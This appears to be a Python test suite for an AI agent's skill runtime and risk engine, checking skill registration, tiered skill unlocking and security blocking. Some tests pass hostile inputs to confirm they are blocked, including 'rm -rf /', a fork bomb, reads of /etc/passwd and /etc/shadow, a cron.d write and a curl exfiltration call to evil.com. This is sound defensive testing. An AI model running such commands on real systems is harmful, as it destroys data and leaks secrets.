"""
Phase 4 — Skill 运行时 + Risk Engine 测试套件

测试范围：
  1. BaseSkill 抽象基类 + SkillResult
  2. SkillRegistry 注册/查询/自动发现
  3. 具体 Skills（browser / file / shell）参数校验 + 安全拦截
  4. RiskEngine 双层风险评估 + 动态参数分析

测试策略：
  - 纯单元测试，不依赖 Redis/PG（但 AuditGateway 的集成测试除外）
  - 每个测试方法只验证一个行为
"""
import pytest

from app.skills.base import BaseSkill, SkillCategory, SkillContext, SkillResult
from app.skills.enums import RiskLevel, SkillTier
from app.skills.registry import SkillRegistry, registry as global_registry
from app.skills.browser import (
    GotoSkill, ClickSkill, ScreenshotSkill, TypeSkill, ExtractTextSkill,
)
from app.skills.file import ReadFileSkill, WriteFileSkill
from app.skills.shell import RunCommandSkill
from app.skills.selector import SkillSelector, TIER_KEYWORDS, TIER_DESCRIPTIONS
from app.engine.risk import RiskEngine, RiskAssessment


# ====================================================================
# Test Suite 1: BaseSkill 抽象基类
# ====================================================================


class TestBaseSkill:
    """验证 BaseSkill 抽象基类的行为"""

    def test_subclass_without_name_raises_error(self):
        """验证：子类不定义 name 时抛出 TypeError"""
        with pytest.raises(TypeError, match="name"):
            class NoNameSkill(BaseSkill):
                description = "test"
                category = SkillCategory.BROWSER
                risk_level = RiskLevel.L1_READONLY

                async def execute(self, context, **params):
                    return SkillResult.ok()

    def test_subclass_without_description_raises_error(self):
        """验证：子类不定义 description 时抛出 TypeError"""
        with pytest.raises(TypeError, match="description"):
            class NoDescSkill(BaseSkill):
                name = "no_desc"
                category = SkillCategory.BROWSER
                risk_level = RiskLevel.L1_READONLY

                async def execute(self, context, **params):
                    return SkillResult.ok()

    def test_valid_subclass_creates_successfully(self):
        """验证：正确定义的子类可以正常创建"""
        skill = GotoSkill()
        assert skill.name == "browser_goto"
        assert skill.description == "导航到指定的 URL 地址"
        assert skill.category == SkillCategory.BROWSER
        assert skill.risk_level == RiskLevel.L1_READONLY


# ====================================================================
# Test Suite 2: SkillResult / SkillContext
# ====================================================================


class TestSkillResult:
    """验证 SkillResult 数据类的行为"""

    def test_default_construction(self):
        """验证：默认构造为成功结果"""
        result = SkillResult()
        assert result.success is True
        assert result.data is None
        assert result.error is None
        assert result.execution_time_ms == 0

    def test_ok_factory(self):
        """验证：ok() 快捷构造"""
        result = SkillResult.ok({"key": "value"})
        assert result.success is True
        assert result.data == {"key": "value"}

    def test_fail_factory(self):
        """验证：fail() 快捷构造"""
        result = SkillResult.fail("错误消息", {"partial": "data"})
        assert result.success is False
        assert result.error == "错误消息"
        assert result.data == {"partial": "data"}

    def test_execution_time_is_set_correctly(self):
        """验证：execution_time_ms 正确设置"""
        result = SkillResult.ok()
        result.execution_time_ms = 150
        assert result.execution_time_ms == 150


class TestSkillContext:
    """验证 SkillContext 数据类的行为"""

    def test_default_context(self):
        """验证：默认上下文字段初始值正确"""
        ctx = SkillContext()
        assert ctx.session_id == 0
        assert ctx.request_id == ""
        assert ctx.sandbox_id is None

    def test_custom_context(self):
        """验证：自定义上下文字段"""
        ctx = SkillContext(session_id=1, request_id="req-123", sandbox_id="sandbox-1")
        assert ctx.session_id == 1
        assert ctx.request_id == "req-123"
        assert ctx.sandbox_id == "sandbox-1"


# ====================================================================
# Test Suite 3: SkillRegistry
# ====================================================================


class TestSkillRegistry:
    """验证 SkillRegistry 的行为"""

    @pytest.fixture
    def registry(self):
        """每个测试使用干净的 registry 实例"""
        return SkillRegistry()

    @pytest.fixture
    def click_skill(self):
        return ClickSkill()

    def test_register_and_get(self, registry, click_skill):
        """验证：注册后可获取"""
        registry.register(click_skill)
        assert registry.get("browser_click") is click_skill

    def test_get_nonexistent(self, registry):
        """验证：获取未注册的 Skill 返回 None"""
        assert registry.get("nonexistent") is None

    def test_get_or_raise_nonexistent(self, registry):
        """验证：get_or_raise 抛出 KeyError"""
        with pytest.raises(KeyError, match="nonexistent"):
            registry.get_or_raise("nonexistent")

    def test_duplicate_register_raises(self, registry, click_skill):
        """验证：重复注册同名 Skill 抛出 ValueError"""
        registry.register(click_skill)
        with pytest.raises(ValueError, match="名称冲突"):
            registry.register(ClickSkill())

    def test_list_all(self, registry):
        """验证：list_all 返回所有注册的 Skill"""
        registry.register(ClickSkill())
        registry.register(GotoSkill())
        registry.register(ScreenshotSkill())
        assert len(registry.list_all()) == 3

    def test_list_by_risk(self, registry):
        """验证：按风险等级筛选"""
        registry.register(GotoSkill())       # L1
        registry.register(ClickSkill())      # L2
        registry.register(ReadFileSkill())   # L3
        registry.register(RunCommandSkill()) # L4

        l1_skills = registry.list_by_risk(RiskLevel.L1_READONLY)
        assert len(l1_skills) == 1
        assert l1_skills[0].name == "browser_goto"

        l4_skills = registry.list_by_risk(RiskLevel.L4_SHELL)
        assert len(l4_skills) == 1
        assert l4_skills[0].name == "shell_run"

    def test_list_by_tier(self, registry):
        """验证：按披露层级筛选"""
        registry.register(GotoSkill())          # CORE
        registry.register(ClickSkill())         # INTERACTION
        registry.register(ReadFileSkill())      # FILE
        registry.register(RunCommandSkill())    # SHELL

        core_skills = registry.list_by_tier(SkillTier.CORE)
        assert len(core_skills) == 1
        assert core_skills[0].name == "browser_goto"

        shell_skills = registry.list_by_tier(SkillTier.SHELL)
        assert len(shell_skills) == 1
        assert shell_skills[0].name == "shell_run"

    def test_list_by_tiers(self, registry):
        """验证：按多个披露层级筛选"""
        registry.register(GotoSkill())          # CORE
        registry.register(ClickSkill())         # INTERACTION
        registry.register(ReadFileSkill())      # FILE
        registry.register(RunCommandSkill())    # SHELL

        browser_and_file = registry.list_by_tiers({SkillTier.CORE, SkillTier.FILE})
        names = {s.name for s in browser_and_file}
        assert "browser_goto" in names          # CORE
        assert "file_read" in names             # FILE
        assert "browser_click" not in names     # INTERACTION 不在集合中
        assert "shell_run" not in names         # SHELL 不在集合中

    def test_count(self, registry):
        """验证：count() 返回正确数量"""
        assert registry.count() == 0
        registry.register(GotoSkill())
        assert registry.count() == 1

    def test_discover_discovers_all_concrete_skills(self, registry):
        """验证：discover() 自动发现所有已导入的 Skill 子类"""
        # 先导入所有 skill 模块
        import app.skills.browser  # noqa: F401
        import app.skills.file     # noqa: F401
        import app.skills.shell    # noqa: F401

        count = registry.discover()
        # 应发现所有 8 个具体 Skill
        assert count == 8

        # 验证各分类的 Skill 都在
        names = {s.name for s in registry.list_all()}
        assert "browser_goto" in names
        assert "browser_click" in names
        assert "browser_type" in names
        assert "browser_screenshot" in names
        assert "browser_extract_text" in names
        assert "file_read" in names
        assert "file_write" in names
        assert "shell_run" in names


# ====================================================================
# Test Suite 4: 具体 Skills
# ====================================================================


class TestBrowserSkills:
    """验证 Browser Skills 参数校验"""

    @pytest.fixture
    def ctx(self):
        return SkillContext(session_id=1)

    async def test_goto_missing_url(self, ctx):
        """验证：缺少 url 参数返回失败"""
        skill = GotoSkill()
        result = await skill.execute(ctx)
        assert result.success is False
        assert "url" in result.error

    async def test_goto_with_url(self, ctx):
        """验证：正常导航"""
        skill = GotoSkill()
        result = await skill.execute(ctx, url="https://example.com")
        assert result.success is True

    async def test_click_missing_selector(self, ctx):
        """验证：缺少 selector 参数返回失败"""
        skill = ClickSkill()
        result = await skill.execute(ctx)
        assert result.success is False
        assert "selector" in result.error

    async def test_click_with_selector(self, ctx):
        """验证：正常点击"""
        skill = ClickSkill()
        result = await skill.execute(ctx, selector="#submit-btn")
        assert result.success is True

    async def test_screenshot_always_succeeds(self, ctx):
        """验证：截图总是成功"""
        skill = ScreenshotSkill()
        result = await skill.execute(ctx)
        assert result.success is True

    async def test_extract_text_no_selector(self, ctx):
        """验证：不传 selector 时默认提取 body 文本"""
        skill = ExtractTextSkill()
        result = await skill.execute(ctx)
        assert result.success is True

    async def test_extract_text_with_selector(self, ctx):
        """验证：传入 CSS 选择器限定区域"""
        skill = ExtractTextSkill()
        result = await skill.execute(ctx, selector="#main-content")
        assert result.success is True

    async def test_type_missing_selector(self, ctx):
        """验证：缺少 selector 返回失败"""
        skill = TypeSkill()
        result = await skill.execute(ctx, text="hello")
        assert result.success is False

    async def test_type_with_all_params(self, ctx):
        """验证：正常输入"""
        skill = TypeSkill()
        result = await skill.execute(ctx, selector="#input", text="hello world")
        assert result.success is True


class TestFileSkills:
    """验证 File Skills 参数校验 + 安全拦截"""

    @pytest.fixture
    def ctx(self):
        return SkillContext(session_id=1)

    async def test_read_missing_path(self, ctx):
        """验证：缺少 path 参数返回失败"""
        skill = ReadFileSkill()
        result = await skill.execute(ctx)
        assert result.success is False
        assert "path" in result.error

    async def test_read_normal_file(self, ctx):
        """验证：正常文件读取"""
        skill = ReadFileSkill()
        result = await skill.execute(ctx, path="/tmp/test.txt")
        assert result.success is True

    async def test_read_sensitive_file_blocked(self, ctx):
        """验证：禁止读取敏感文件"""
        skill = ReadFileSkill()
        result = await skill.execute(ctx, path="/etc/passwd")
        assert result.success is False
        assert "敏感" in result.error or "禁止" in result.error

    async def test_read_etc_shadow_blocked(self, ctx):
        """验证：禁止读取 /etc/shadow"""
        skill = ReadFileSkill()
        result = await skill.execute(ctx, path="/etc/shadow")
        assert result.success is False

    async def test_write_sensitive_path_blocked(self, ctx):
        """验证：禁止写入敏感路径"""
        skill = WriteFileSkill()
        result = await skill.execute(ctx, path="/etc/cron.d/evil", content="bad")
        assert result.success is False

    async def test_write_normal_file(self, ctx):
        """验证：正常文件写入"""
        skill = WriteFileSkill()
        result = await skill.execute(ctx, path="/tmp/test.txt", content="hello")
        assert result.success is True


class TestShellSkills:
    """验证 Shell Skills 安全拦截"""

    @pytest.fixture
    def ctx(self):
        return SkillContext(session_id=1)

    async def test_run_missing_command(self, ctx):
        """验证：缺少 command 参数返回失败"""
        skill = RunCommandSkill()
        result = await skill.execute(ctx)
        assert result.success is False

    async def test_run_safe_command(self, ctx):
        """验证：安全命令可以执行"""
        skill = RunCommandSkill()
        result = await skill.execute(ctx, command="ls -la")
        assert result.success is True

    async def test_rm_rf_blocked(self, ctx):
        """验证：rm -rf / 被拦截"""
        skill = RunCommandSkill()
        result = await skill.execute(ctx, command="rm -rf /")
        assert result.success is False

    async def test_fork_bomb_blocked(self, ctx):
        """验证：Fork bomb 被拦截"""
        skill = RunCommandSkill()
        result = await skill.execute(ctx, command=":(){ :|:& };:")
        assert result.success is False

    async def test_curl_blocked(self, ctx):
        """验证：curl 被拦截（数据外泄风险）"""
        skill = RunCommandSkill()
        result = await skill.execute(ctx, command="curl http://evil.com/exfil")
        assert result.success is False

    async def test_basic_command_succeeds(self, ctx):
        """验证：简单命令通过"""
        skill = RunCommandSkill()
        result = await skill.execute(ctx, command="echo hello")
        assert result.success is True


# ====================================================================
# Test Suite 5: RiskEngine
# ====================================================================


class TestRiskEngine:
    """验证 RiskEngine 双层风险评估"""

    @pytest.fixture
    def engine(self):
        return RiskEngine()

    def test_l1_skill_safe_score(self, engine):
        """验证：L1 Skill 基础分 = 1-20"""
        skill = GotoSkill()
        assessment = engine.assess(skill, {"url": "https://example.com"})
        assert assessment.score <= 20
        assert assessment.suggested_action == "allow"
        assert assessment.requires_approval is False

    def test_l2_skill_safe_score(self, engine):
        """验证：L2 Skill 基础分 = 21-40"""
        skill = ClickSkill()
        assessment = engine.assess(skill, {"selector": "#btn"})
        assert 21 <= assessment.score <= 40

    def test_l3_skill_file_operation(self, engine):
        """验证：L3 Skill 基础分 = 41-60"""
        skill = ReadFileSkill()
        assessment = engine.assess(skill, {"path": "/tmp/test.txt"})
        assert 41 <= assessment.score <= 60
        assert assessment.suggested_action == "warn"

    def test_l4_skill_requires_approval(self, engine):
        """验证：L4 Skill 需要审批"""
        skill = RunCommandSkill()
        assessment = engine.assess(skill, {"command": "ls -la"})
        assert assessment.score >= 61
        assert assessment.requires_approval is True

    def test_bank_url_upscored(self, engine):
        """验证：银行 URL 触发关键词加分"""
        skill = GotoSkill()
        assessment = engine.assess(skill, {"url": "https://bank.example.com/transfer"})
        assert assessment.score > 20  # 基础分 + 关键词加分
        assert len(assessment.reasons) > 0

    def test_blocked_url_directly_blocked(self, engine):
        """验证：file:// 协议直接拦截"""
        skill = GotoSkill()
        assessment = engine.assess(skill, {"url": "file:///etc/passwd"})
        assert assessment.is_blocked is True
        assert assessment.suggested_action == "block"

    def test_blocked_chrome_url(self, engine):
        """验证：chrome:// 协议直接拦截"""
        skill = GotoSkill()
        assessment = engine.assess(skill, {"url": "chrome://settings"})
        assert assessment.is_blocked is True

    def test_high_risk_domain_detected(self, engine):
        """验证：高危域名（bank）被检测"""
        skill = ClickSkill()
        assessment = engine.assess(skill, {"url": "https://mybank.com/login"})
        assert assessment.score > 40  # 基础分 + 域名加分

    def test_rm_rf_command_high_score(self, engine):
        """验证：rm -rf 命令获得高分"""
        skill = RunCommandSkill()
        assessment = engine.assess(skill, {"command": "rm -rf /important/data"})
        assert assessment.score > 80
        # L4 + 额外关键词可能升到 L5
        if assessment.level == RiskLevel.L5_DESTRUCTIVE:
            assert assessment.is_blocked is True

    def test_empty_params_does_not_crash(self, engine):
        """验证：空参数不崩溃"""
        skill = GotoSkill()
        assessment = engine.assess(skill, {})
        assert assessment.score <= 20
        assert assessment.suggested_action == "allow"

    def test_to_dict_serializable(self, engine):
        """验证：RiskAssessment.to_dict() 可 JSON 序列化"""
        skill = RunCommandSkill()
        assessment = engine.assess(skill, {"command": "sudo rm -rf /"})
        d = assessment.to_dict()
        assert isinstance(d, dict)
        assert "level" in d
        assert "score" in d
        assert "reasons" in d
        assert "requires_approval" in d
        assert "suggested_action" in d


# ====================================================================
# Test Suite 6: SkillSelector
# ====================================================================


class TestSkillSelector:
    """验证 SkillSelector 渐进式技能选择器"""

    @pytest.fixture
    def selector(self):
        return SkillSelector()

    @pytest.fixture
    def populated_registry(self):
        """注册所有 8 个 Skill 到全局 registry"""
        import app.skills.browser  # noqa: F401
        import app.skills.file     # noqa: F401
        import app.skills.shell    # noqa: F401

        reg = SkillRegistry()
        for skill_cls in [GotoSkill, ClickSkill, ScreenshotSkill, TypeSkill,
                          ExtractTextSkill, ReadFileSkill, WriteFileSkill,
                          RunCommandSkill]:
            reg.register(skill_cls())
        return reg

    # ---- 初始状态 ----

    def test_default_only_core_unlocked(self, selector):
        """验证：默认只解锁 CORE"""
        assert selector.active_tiers == {SkillTier.CORE}

    def test_custom_initial_tiers(self):
        """验证：自定义初始 Tier"""
        s = SkillSelector(initial_tiers={SkillTier.CORE, SkillTier.INTERACTION})
        assert s.active_tiers == {SkillTier.CORE, SkillTier.INTERACTION}

    # ---- unlock / lock / is_unlocked ----

    def test_unlock_new_tier(self, selector):
        """验证：解锁新 Tier 返回 True"""
        assert selector.unlock(SkillTier.INTERACTION) is True
        assert SkillTier.INTERACTION in selector.active_tiers

    def test_unlock_already_unlocked(self, selector):
        """验证：重复解锁返回 False"""
        assert selector.unlock(SkillTier.CORE) is False  # CORE 默认已解锁

    def test_lock_specific_tier(self, selector):
        """验证：锁定指定 Tier"""
        selector.unlock(SkillTier.INTERACTION)
        assert SkillTier.INTERACTION in selector.active_tiers
        selector.lock(SkillTier.INTERACTION)
        assert SkillTier.INTERACTION not in selector.active_tiers

    def test_lock_reset(self, selector):
        """验证：lock() 无参数重置到仅 CORE"""
        selector.unlock(SkillTier.FILE)
        selector.unlock(SkillTier.SHELL)
        assert len(selector.active_tiers) == 3
        selector.lock()
        assert selector.active_tiers == {SkillTier.CORE}

    def test_is_unlocked(self, selector):
        """验证：is_unlocked 正确判断"""
        assert selector.is_unlocked(SkillTier.CORE) is True
        assert selector.is_unlocked(SkillTier.INTERACTION) is False
        selector.unlock(SkillTier.INTERACTION)
        assert selector.is_unlocked(SkillTier.INTERACTION) is True

    # ---- 可见技能过滤 ----

    def test_get_visible_skills_default(self, selector, populated_registry):
        """验证：默认只看到 CORE 技能"""
        # 用 populated_registry 替换全局 registry
        import app.skills.registry as reg_mod
        original = reg_mod.registry._skills
        reg_mod.registry._skills = populated_registry._skills
        try:
            skills = selector.get_visible_skills()
            names = {s.name for s in skills}
            assert "browser_goto" in names          # CORE
            assert "browser_screenshot" in names    # CORE
            assert "browser_extract_text" in names  # CORE
            assert "browser_click" not in names     # INTERACTION
            assert "shell_run" not in names         # SHELL
            assert len(skills) == 3                 # 只有 3 个 CORE skill
        finally:
            reg_mod.registry._skills = original

    def test_get_visible_skills_after_unlock(self, selector, populated_registry):
        """验证：解锁 INTERACTION 后可看到 click/type"""
        import app.skills.registry as reg_mod
        original = reg_mod.registry._skills
        reg_mod.registry._skills = populated_registry._skills
        try:
            selector.unlock(SkillTier.INTERACTION)
            names = {s.name for s in selector.get_visible_skills()}
            assert "browser_goto" in names
            assert "browser_click" in names
            assert "browser_type" in names
            assert "shell_run" not in names          # SHELL 仍未解锁
        finally:
            reg_mod.registry._skills = original

    def test_get_skill_visible(self, selector, populated_registry):
        """验证：get_skill 在 Tier 解锁时可用"""
        import app.skills.registry as reg_mod
        original = reg_mod.registry._skills
        reg_mod.registry._skills = populated_registry._skills
        try:
            skill = selector.get_skill("browser_goto")
            assert skill is not None
            assert skill.name == "browser_goto"
        finally:
            reg_mod.registry._skills = original

    def test_get_skill_not_visible(self, selector, populated_registry):
        """验证：get_skill 在 Tier 未解锁时返回 None"""
        import app.skills.registry as reg_mod
        original = reg_mod.registry._skills
        reg_mod.registry._skills = populated_registry._skills
        try:
            skill = selector.get_skill("shell_run")  # SHELL 未解锁
            assert skill is None
        finally:
            reg_mod.registry._skills = original

    def test_get_skill_nonexistent(self, selector):
        """验证：get_skill 未知名称返回 None"""
        assert selector.get_skill("nonexistent") is None

    # ---- LLM Tool 格式 ----

    def test_get_llm_tools_format(self, selector, populated_registry):
        """验证：get_llm_tools 返回 OpenAI function calling 格式"""
        import app.skills.registry as reg_mod
        original = reg_mod.registry._skills
        reg_mod.registry._skills = populated_registry._skills
        try:
            tools = selector.get_llm_tools()
            assert len(tools) == 3  # 默认只有 CORE
            for tool in tools:
                assert tool["type"] == "function"
                assert "function" in tool
                assert "name" in tool["function"]
                assert "description" in tool["function"]
                assert "parameters" in tool["function"]
                assert tool["function"]["parameters"]["type"] == "object"
        finally:
            reg_mod.registry._skills = original

    # ---- 自动推断 ----

    def test_detect_required_tiers_empty(self):
        """验证：空文本不检测到任何 Tier（不含 CORE）"""
        result = SkillSelector.detect_required_tiers("")
        assert result == []

    def test_detect_required_tiers_click(self):
        """验证：包含"点击"检测到 INTERACTION"""
        result = SkillSelector.detect_required_tiers("点击搜索按钮")
        assert SkillTier.INTERACTION in result

    def test_detect_required_tiers_file(self):
        """验证：包含"读取文件"检测到 FILE"""
        result = SkillSelector.detect_required_tiers("读取文件 /tmp/test.txt")
        assert SkillTier.FILE in result

    def test_detect_required_tiers_shell(self):
        """验证：包含"执行命令"检测到 SHELL"""
        result = SkillSelector.detect_required_tiers("执行命令 ls -la")
        assert SkillTier.SHELL in result

    def test_detect_required_tiers_sorted_by_risk(self):
        """验证：多 Tier 检测结果按风险升序排列"""
        result = SkillSelector.detect_required_tiers(
            "先读取文件 /tmp/test.txt，再执行命令 ls -la"
        )
        # File (index 2) 应排在 Shell (index 3) 之前
        assert result == [SkillTier.FILE, SkillTier.SHELL]

    def test_estimate_tier_description(self):
        """验证：estimate_tier_description 返回可读描述"""
        desc = SkillSelector.estimate_tier_description(SkillTier.SHELL)
        assert isinstance(desc, str)
        assert len(desc) > 0
